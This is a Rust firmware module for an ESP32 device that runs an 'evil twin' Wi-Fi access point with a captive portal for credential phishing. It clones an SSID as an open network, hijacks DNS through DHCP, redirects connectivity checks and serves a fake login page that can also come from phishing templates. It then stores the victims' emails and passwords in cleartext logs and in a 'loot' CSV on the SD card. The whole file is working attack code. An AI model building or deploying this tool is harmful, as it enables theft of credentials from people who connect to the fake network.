//! AP « evil twin » + portail captif (phishing d'identifiants).
//!
//! Porté depuis `feature/wifi_attacks:src/wifi_ap.rs`. Adaptations menu :
//!   - `modem` emprunté (`impl Peripheral`) ;
//!   - bouton retour (`back`) : arrête le thread DNS, coupe l'AP, rend le modem ;
//!   - `unwrap()` de conversion SSID/pass remplacés par `?` (conventions projet).
//!
//! Monte un SoftAP, force le DHCP à annoncer notre IP comme DNS, lance un DNS
//! captif ([`super::captive_dns`]) et sert une page de login qui capture
//! email/mot de passe.

use esp_idf_svc::eventloop::EspSystemEventLoop;
use esp_idf_svc::hal::delay::FreeRtos;
use esp_idf_svc::hal::gpio::{Input, PinDriver};
use esp_idf_svc::hal::modem::WifiModemPeripheral;
use esp_idf_svc::nvs::EspDefaultNvsPartition;
use esp_idf_svc::wifi::{AccessPointConfiguration, AuthMethod, BlockingWifi, Configuration, EspWifi};
use esp_idf_svc::sys::{
    esp_netif_dhcp_option_id_t_ESP_NETIF_DOMAIN_NAME_SERVER, esp_netif_dhcp_option_mode_t_ESP_NETIF_OP_SET,
    esp_netif_dhcps_option, esp_netif_dhcps_start, esp_netif_dhcps_stop, esp_netif_dns_info_t,
    esp_netif_dns_type_t_ESP_NETIF_DNS_MAIN, esp_netif_get_handle_from_ifkey, esp_netif_set_dns_info,
    esp_wifi_ap_get_sta_list, wifi_sta_list_t,
};
use esp_idf_svc::http::server::{Configuration as HttpConfig, EspHttpServer};
use esp_idf_svc::http::Method;
use embedded_graphics::{
    mono_font::{ascii::FONT_6X10, MonoTextStyle},
    pixelcolor::Rgb565,
    prelude::*,
    primitives::{PrimitiveStyleBuilder, Rectangle},
    text::Text,
};
use log::info;
use std::sync::atomic::{AtomicU32, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{SystemTime, UNIX_EPOCH};

const BG: Rgb565 = Rgb565::new(1, 4, 2);
const ORANGE: Rgb565 = Rgb565::new(31, 35, 0);
const WHITE: Rgb565 = Rgb565::new(31, 63, 31);
const GRAY: Rgb565 = Rgb565::new(9, 22, 13);
const DIM: Rgb565 = Rgb565::new(16, 34, 20);

// Page HTML avec formulaire email/password
const PAGE: &str = r#"<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Axolotl Zero</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a1410;color:#eee;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#111e18;padding:40px;border-radius:16px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.8)}
.logo{text-align:center;font-size:64px;margin-bottom:10px}
h1{color:#ff8c00;font-size:32px;text-align:center;letter-spacing:2px;margin-bottom:4px}
.sub{color:#9fd;text-align:center;font-size:14px;margin-bottom:25px}
.tag{display:inline-block;background:#ff8c00;color:#0a1410;padding:4px 14px;border-radius:20px;font-weight:bold;font-size:12px;text-align:center;width:100%;margin-bottom:20px}
.form-group{margin-bottom:18px}
label{display:block;color:#9fd;font-size:13px;margin-bottom:5px;font-weight:500}
input{width:100%;padding:12px 14px;background:#0a1410;border:2px solid #1a2e24;border-radius:8px;color:#eee;font-size:15px;transition:border-color .3s}
input:focus{outline:none;border-color:#ff8c00}
button{width:100%;padding:12px;background:linear-gradient(135deg,#ff8c00,#e67600);border:none;border-radius:8px;color:#0a1410;font-size:16px;font-weight:700;cursor:pointer;transition:transform .2s}
button:hover{transform:scale(1.02)}
.foot{text-align:center;margin-top:18px;color:#456;font-size:12px}
.error{color:#ff4444;text-align:center;margin-top:10px;display:none;font-size:13px}
.success{color:#44ff88;text-align:center;margin-top:10px;display:none;font-size:13px}
</style></head><body>
<div class="box">
<div class="logo">📶</div>
<h1>AXOLOTL ZERO</h1>
<p class="sub">Connexion WiFi sécurisée</p>
<div class="tag">🔒 Réseau privé</div>

<form id="loginForm" onsubmit="submitForm(event)">
<div class="form-group">
<label>📧 Email</label>
<input type="email" id="email" placeholder="exemple@email.com" required>
</div>
<div class="form-group">
<label>🔑 Mot de passe</label>
<input type="password" id="password" placeholder="Votre mot de passe" required>
</div>
<button type="submit">Se connecter</button>
<div class="error" id="error">Identifiants incorrects</div>
<div class="success" id="success">✅ Connexion établie !</div>
</form>

<div class="foot">🔐 Sécurisé • __VISITS__ visite(s)</div>
</div>

<script>
function submitForm(e){e.preventDefault();const email=document.getElementById('email').value;const password=document.getElementById('password').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email='+encodeURIComponent(email)+'&password='+encodeURIComponent(password)}).then(r=>r.json()).then(d=>{if(d.success){document.getElementById('error').style.display='none';document.getElementById('success').style.display='block';setTimeout(()=>{window.location.href='https://www.google.com'},2500)}else{document.getElementById('error').style.display='block'}}).catch(()=>{document.getElementById('error').style.display='block'})}
</script>
</body></html>"#;

// Structure pour stocker les credentials
#[derive(Clone)]
struct Credential {
    email: String,
    // Capturé et loggé (log_credential_to_shell) au moment de la capture ; on
    // garde le champ dans le struct même si l'écran n'affiche que l'email.
    #[allow(dead_code)]
    password: String,
    timestamp: String,
}

// Stockage thread-safe des credentials
static CAPTURED_CREDS: Mutex<Vec<Credential>> = Mutex::new(Vec::new());

// Fonction pour ajouter un credential
fn add_credential(email: String, password: String) -> usize {
    let timestamp = get_timestamp();
    let cred = Credential { email, password, timestamp };

    if let Ok(mut guard) = CAPTURED_CREDS.lock() {
        guard.push(cred);
        return guard.len();
    }
    0
}

// Fonction pour lire les credentials
fn get_credentials() -> Vec<Credential> {
    if let Ok(guard) = CAPTURED_CREDS.lock() {
        return guard.clone();
    }
    Vec::new()
}

// Obtenir un timestamp simple
fn get_timestamp() -> String {
    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs();

    let hours = (now % 86400) / 3600;
    let minutes = (now % 3600) / 60;
    let seconds = now % 60;

    format!("{:02}:{:02}:{:02}", hours, minutes, seconds)
}

// Force le DHCP du point d acces a annoncer notre IP comme serveur DNS.
unsafe fn force_dns_dhcp(ip_addr: u32) {
    let ap = esp_netif_get_handle_from_ifkey(c"WIFI_AP_DEF".as_ptr() as *const _);
    if ap.is_null() {
        info!("DHCP-DNS: netif AP introuvable");
        return;
    }
    esp_netif_dhcps_stop(ap);

    let mut offer: u8 = 1;
    esp_netif_dhcps_option(
        ap,
        esp_netif_dhcp_option_mode_t_ESP_NETIF_OP_SET,
        esp_netif_dhcp_option_id_t_ESP_NETIF_DOMAIN_NAME_SERVER,
        &mut offer as *mut u8 as *mut core::ffi::c_void,
        1,
    );

    let mut dns: esp_netif_dns_info_t = core::mem::zeroed();
    dns.ip.u_addr.ip4.addr = ip_addr;
    dns.ip.type_ = 0;
    esp_netif_set_dns_info(ap, esp_netif_dns_type_t_ESP_NETIF_DNS_MAIN, &mut dns);

    esp_netif_dhcps_start(ap);
    info!("DHCP-DNS: DNS captif configuré");
}

// Envoyer credentials au shell
fn log_credential_to_shell(email: &str, password: &str, ip: &str) {
    let timestamp = get_timestamp();
    info!("═══════════════════════════════════════════");
    info!("📨 CREDENTIAL CAPTURED !");
    info!("📧 Email    : {}", email);
    info!("🔑 Password : {}", password);
    info!("🌐 IP       : {}", ip);
    info!("🕐 Time     : {}", timestamp);
    info!("═══════════════════════════════════════════");
}

/// Persiste un credential capturé sur la SD : `/sdcard/loot/creds.csv`
/// (append, format `timestamp,ssid,email,password`). Non-bloquant : toute
/// erreur SD est loggée mais n'interrompt pas la capture.
fn save_credential_to_sd(ssid: &str, email: &str, password: &str) {
    use std::io::Write;
    let _ = std::fs::create_dir_all("/sdcard/loot");
    // Neutralise les virgules/retours pour ne pas casser le CSV.
    let san = |s: &str| s.replace([',', '\n', '\r'], " ");
    let line = format!("{},{},{},{}\n", get_timestamp(), san(ssid), san(email), san(password));
    match std::fs::OpenOptions::new().create(true).append(true).open("/sdcard/loot/creds.csv") {
        Ok(mut f) => {
            if let Err(e) = f.write_all(line.as_bytes()) {
                log::warn!("creds SD: écriture KO: {:?}", e);
            }
        }
        Err(e) => log::warn!("creds SD: ouverture KO: {:?}", e),
    }
}

/// Devine le Content-Type d'un asset servi depuis la SD, d'après l'extension.
fn content_type(path: &str) -> &'static str {
    let ext = path.rsplit('.').next().unwrap_or("").to_ascii_lowercase();
    match ext.as_str() {
        "html" | "htm" => "text/html; charset=utf-8",
        "css" => "text/css",
        "js" => "application/javascript",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "svg" => "image/svg+xml",
        "ico" => "image/x-icon",
        "webp" => "image/webp",
        "woff" => "font/woff",
        "woff2" => "font/woff2",
        "json" => "application/json",
        _ => "application/octet-stream",
    }
}

// Fonction de décodage URL simple
fn url_decode(s: &str) -> String {
    let mut result = String::new();
    let mut chars = s.chars().peekable();

    while let Some(c) = chars.next() {
        if c == '%' {
            // Lire les deux caractères hex suivants
            let mut hex = String::new();
            for _ in 0..2 {
                if let Some(next) = chars.next() {
                    hex.push(next);
                }
            }
            if hex.len() == 2 {
                if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                    result.push(byte as char);
                } else {
                    result.push('%');
                    result.push_str(&hex);
                }
            } else {
                result.push('%');
                result.push_str(&hex);
            }
        } else if c == '+' {
            result.push(' ');
        } else {
            result.push(c);
        }
    }

    result
}

/// Lance l'evil twin et affiche les stats de capture. `back` arrête le DNS
/// captif, coupe l'AP et rend le modem.
#[allow(clippy::too_many_arguments)]
pub fn run<D>(
    modem: impl WifiModemPeripheral,
    sys_loop: EspSystemEventLoop,
    nvs: EspDefaultNvsPartition,
    display: &mut D,
    back: &PinDriver<'_, Input>,
    ssid: &str,
    portal_path: &str,
) -> anyhow::Result<()>
where
    D: DrawTarget<Color = Rgb565>,
    D::Error: core::fmt::Debug,
{
    info!("=== Evil-twin : SSID cloné '{}' — portail '{}' ===", ssid, portal_path);
    // Partagés dans les handlers HTTP ('static) via Arc.
    let portal: Arc<str> = Arc::from(portal_path);
    let ap_ssid: Arc<str> = Arc::from(ssid);
    // Dossier du portail : sert les assets relatifs (images/css/js) du template.
    let portal_dir: Arc<str> = {
        let d = std::path::Path::new(portal_path)
            .parent()
            .map(|p| p.to_string_lossy().into_owned())
            .unwrap_or_default();
        Arc::from(d.as_str())
    };

    let mut wifi = BlockingWifi::wrap(EspWifi::new(modem, sys_loop.clone(), Some(nvs))?, sys_loop)?;
    // AP OUVERTE au nom cloné : join facile pour la démo (pas de mot de passe).
    let config = AccessPointConfiguration {
        ssid: ssid.try_into().map_err(|_| anyhow::anyhow!("SSID AP invalide (>32?)"))?,
        auth_method: AuthMethod::None,
        channel: 6,
        max_connections: 4,
        ..Default::default()
    };
    wifi.set_configuration(&Configuration::AccessPoint(config))?;
    wifi.start()?;
    info!("Point d'acces ouvert actif : {} / 192.168.71.1", ssid);

    let ip_u32: u32 = 192 | (168 << 8) | (71 << 16) | (1 << 24);
    unsafe {
        force_dns_dhcp(ip_u32);
    }

    // Serveur DNS captif (thread arrêtable via super::captive_dns::STOP).
    let dns_handle = std::thread::Builder::new()
        .stack_size(4096)
        .spawn(|| super::captive_dns::run([192, 168, 71, 1]))?;

    let visits = Arc::new(AtomicU32::new(0));
    let visits_http = visits.clone();
    let cred_count = Arc::new(AtomicUsize::new(0));
    let cred_count_clone = cred_count.clone();

    // uri_match_wildcard : permet un handler `/*` catch-all pour les assets.
    // Les templates sans `*` restent des matches exacts (/, /login, redirects).
    let mut server = EspHttpServer::new(&HttpConfig {
        uri_match_wildcard: true,
        ..Default::default()
    })?;

    // Page d'accueil : sert le template SD choisi (fallback = page intégrée).
    let portal_http = portal.clone();
    server.fn_handler("/", Method::Get, move |req| {
        let n = visits_http.fetch_add(1, Ordering::SeqCst) + 1;
        let data = std::fs::read(portal_http.as_ref())
            .unwrap_or_else(|_| PAGE.replace("__VISITS__", &n.to_string()).into_bytes());
        let mut resp = req.into_ok_response()?;
        // Écriture par chunks : le HTML SD peut être volumineux.
        for chunk in data.chunks(1024) {
            resp.write(chunk)?;
        }
        Ok::<(), esp_idf_svc::io::EspIOError>(())
    })?;

    // Endpoint pour capturer les credentials - VERSION ULTRA ROBUSTE
    let creds_ssid = ap_ssid.clone();
    server.fn_handler("/login", Method::Post, move |mut req| {
        info!("🔍 Nouvelle requête POST /login reçue");

        // 1. Lire les headers pour debug
        if let Some(content_type) = req.header("Content-Type") {
            info!("   Content-Type: {}", content_type);
        }
        if let Some(content_length) = req.header("Content-Length") {
            info!("   Content-Length: {}", content_length);
        }

        // 2. Lire le body de manière robuste
        let mut body_bytes = Vec::new();
        let mut buffer = [0u8; 512];

        loop {
            match req.read(&mut buffer) {
                Ok(0) => {
                    info!("📖 Fin de lecture du body");
                    break;
                }
                Ok(n) => {
                    info!("📖 Lecture de {} bytes", n);
                    body_bytes.extend_from_slice(&buffer[..n]);
                }
                Err(e) => {
                    info!("❌ Erreur de lecture: {:?}", e);
                    break;
                }
            }
        }

        // 3. Afficher le body en texte
        match String::from_utf8(body_bytes.clone()) {
            Ok(body_str) => {
                info!("📝 Body texte: '{}'", body_str);

                // 4. Parser le body
                let mut email = String::new();
                let mut password = String::new();

                for part in body_str.split('&') {
                    if let Some(eq_pos) = part.find('=') {
                        let key = &part[..eq_pos];
                        let value = &part[eq_pos + 1..];

                        let decoded = url_decode(value);

                        // `username` accepté comme alias d'`email` : certains
                        // templates zphisher gardent ce nom de champ.
                        if key == "email" || key == "username" {
                            email = decoded;
                        } else if key == "password" || key == "pass" {
                            password = decoded;
                        }
                    }
                }

                info!("📧 Email final: '{}'", email);
                info!("🔑 Password final: '{}'", password);

                if !email.is_empty() && !password.is_empty() {
                    // Stocker les credentials
                    let count = add_credential(email.clone(), password.clone());
                    cred_count_clone.store(count, Ordering::SeqCst);

                    let ip = req.header("X-Forwarded-For").unwrap_or("192.168.71.x").to_string();

                    log_credential_to_shell(&email, &password, &ip);
                    save_credential_to_sd(&creds_ssid, &email, &password);

                    // Réponse de succès
                    let response = r#"{"success":true,"message":"Connexion réussie"}"#;
                    let mut resp = req.into_response(
                        200,
                        Some("OK"),
                        &[("Content-Type", "application/json"), ("Access-Control-Allow-Origin", "*")],
                    )?;
                    resp.write(response.as_bytes())?;
                } else {
                    info!("❌ Champs vides ! Email: '{}', Password: '{}'", email, password);
                    let response = r#"{"success":false,"message":"Identifiants invalides"}"#;
                    let mut resp = req.into_response(400, Some("Bad Request"), &[("Content-Type", "application/json")])?;
                    resp.write(response.as_bytes())?;
                }
            }
            Err(e) => {
                info!("❌ Erreur UTF-8: {:?}", e);
                let response = r#"{"success":false,"message":"Erreur de traitement"}"#;
                let mut resp = req.into_response(400, Some("Bad Request"), &[("Content-Type", "application/json")])?;
                resp.write(response.as_bytes())?;
            }
        }

        Ok::<(), esp_idf_svc::io::EspIOError>(())
    })?;

    // Redirections pour les tests de connectivité
    for path in [
        "/generate_204",
        "/gen_204",
        "/hotspot-detect.html",
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect",
        "/canonical.html",
        "/success.txt",
    ] {
        server.fn_handler(path, Method::Get, |req| {
            let headers = [("Location", "http://192.168.71.1/")];
            let mut resp = req.into_response(302, Some("Found"), &headers)?;
            resp.write(b"redirect")?;
            Ok::<(), esp_idf_svc::io::EspIOError>(())
        })?;
    }

    // Catch-all `/*` (enregistré EN DERNIER) : sert les assets du template
    // (images, css, js) depuis le dossier SD du portail. Les handlers exacts
    // (`/`, `/login`, redirects) déjà enregistrés priment.
    let asset_dir = portal_dir.clone();
    server.fn_handler("/*", Method::Get, move |req| {
        let uri = req.uri().split('?').next().unwrap_or("/").to_string();
        let rel = uri.trim_start_matches('/');
        // Anti path-traversal : refuse `..`.
        if rel.is_empty() || rel.contains("..") {
            req.into_response(404, Some("Not Found"), &[])?.write(b"nf")?;
            return Ok::<(), esp_idf_svc::io::EspIOError>(());
        }
        let full = format!("{}/{}", asset_dir, rel);
        match std::fs::read(&full) {
            Ok(data) => {
                let ct = content_type(rel);
                let mut resp = req.into_response(200, Some("OK"), &[("Content-Type", ct)])?;
                for chunk in data.chunks(1024) {
                    resp.write(chunk)?;
                }
            }
            Err(_) => {
                req.into_response(404, Some("Not Found"), &[])?.write(b"nf")?;
            }
        }
        Ok::<(), esp_idf_svc::io::EspIOError>(())
    })?;

    info!("✅ Serveur HTTP démarré - http://192.168.71.1");
    info!("📡 WiFi: FZ-Module / motdepasse123");
    info!("🎯 En attente de victimes...");

    // Boucle principale - affichage écran
    loop {
        if back.is_low() {
            // Arrêt propre : stopper le thread DNS (libère le port 53) puis
            // laisser server/wifi se drop → modem rendu à l'appelant.
            super::captive_dns::STOP.store(true, Ordering::Relaxed);
            let _ = dns_handle.join();
            return Ok(());
        }

        let mut sta_list: wifi_sta_list_t = unsafe { core::mem::zeroed() };
        unsafe { esp_wifi_ap_get_sta_list(&mut sta_list) };
        let n = sta_list.num;
        let v = visits.load(Ordering::SeqCst);
        let c = cred_count.load(Ordering::SeqCst);

        display.clear(BG).map_err(|e| anyhow::anyhow!("{:?}", e))?;

        // Header
        Rectangle::new(Point::new(0, 0), Size::new(240, 30))
            .into_styled(PrimitiveStyleBuilder::new().fill_color(GRAY).build())
            .draw(display)
            .map_err(|e| anyhow::anyhow!("{:?}", e))?;
        Text::new("🔴 Portail captif", Point::new(8, 19), MonoTextStyle::new(&FONT_6X10, ORANGE))
            .draw(display)
            .map_err(|e| anyhow::anyhow!("{:?}", e))?;

        let style = MonoTextStyle::new(&FONT_6X10, WHITE);
        Text::new("SSID : FZ-Module", Point::new(8, 48), style)
            .draw(display)
            .map_err(|e| anyhow::anyhow!("{:?}", e))?;
        Text::new("Pass : motdepasse123", Point::new(8, 62), style)
            .draw(display)
            .map_err(|e| anyhow::anyhow!("{:?}", e))?;

        // Statistiques
        let stats = format!("Clients: {}  Visites: {}  Creds: {}", n, v, c);
        Text::new(&stats, Point::new(8, 84), MonoTextStyle::new(&FONT_6X10, ORANGE))
            .draw(display)
            .map_err(|e| anyhow::anyhow!("{:?}", e))?;

        // Afficher les emails capturés
        let creds = get_credentials();
        let nb = creds.len().min(4);
        let mut y = 104i32;

        if nb > 0 {
            Text::new("📨 Derniers emails:", Point::new(8, y), MonoTextStyle::new(&FONT_6X10, DIM))
                .draw(display)
                .map_err(|e| anyhow::anyhow!("{:?}", e))?;
            y += 14;

            for i in 0..nb {
                let idx = creds.len() - 1 - i;
                if let Some(cred) = creds.get(idx) {
                    let email_display = if cred.email.len() > 20 {
                        format!("{}...", &cred.email[..17])
                    } else {
                        cred.email.clone()
                    };
                    let line = format!("{}  {}", cred.timestamp, email_display);
                    Text::new(&line, Point::new(12, y), MonoTextStyle::new(&FONT_6X10, WHITE))
                        .draw(display)
                        .map_err(|e| anyhow::anyhow!("{:?}", e))?;
                    y += 12;
                }
            }
        } else {
            Text::new("⏳ En attente...", Point::new(8, y), MonoTextStyle::new(&FONT_6X10, DIM))
                .draw(display)
                .map_err(|e| anyhow::anyhow!("{:?}", e))?;
        }

        FreeRtos::delay_ms(2000);
    }
}
